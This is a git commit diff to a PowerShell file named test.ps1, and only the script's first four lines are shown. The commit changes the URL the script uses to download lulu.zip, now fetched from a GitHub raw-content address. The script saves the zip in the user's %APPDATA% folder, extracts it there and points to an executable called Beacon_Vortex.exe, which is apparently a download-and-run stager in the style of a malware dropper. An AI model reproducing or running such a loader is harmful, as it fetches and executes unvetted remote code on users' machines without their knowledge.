5e83283118e569a6fc521128a78df3f7b4a4757d
DaleGelb <grunge.explosions@gmail.com>
2025-08-19 08:59:53 +0000

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,4 +1,4 @@
-$zipUrl = "https://dalegelb.github.io/lulu.zip"
+$zipUrl = "https://raw.githubusercontent.com/DaleGelb/files/main/lulu.zip"
 $zipPath = Join-Path $env:APPDATA "lulu.zip"
 $extractPath = $env:APPDATA
 $exePath = Join-Path $env:APPDATA "Beacon_Vortex.exe"
